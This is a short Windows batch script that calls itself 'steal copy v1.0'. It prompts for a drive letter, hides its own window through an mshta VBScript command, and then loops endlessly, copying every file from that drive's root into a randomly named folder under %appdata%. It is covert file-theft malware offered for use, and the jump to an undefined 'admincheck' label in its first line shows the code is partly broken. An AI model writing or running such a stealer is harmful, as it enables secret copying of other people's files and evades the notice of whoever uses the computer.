if "%1"=="hide" goto admincheck
@echo off
mkdir %appdata%\stealcopy
title steal copy v1.0
cls
echo press any key to start.
pause>nul
set /p symbol=Please enter drive symbol - 
set random1=%random%%random%
mkdir %appdata%\stealcopy\%random1%
echo Target Drive - %symbol%:
echo Target Folder - %appdata%\stealcopy\%random1%
echo press any key to copy.
pause>nul
echo Windows Hide in 3 senconds! / / / coded by navi_2
ping 127.0.0.1 -n 3 >nul
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:copy
copy %symbol%:\*.* %appdata%\stealcopy\%random1% /y
goto copy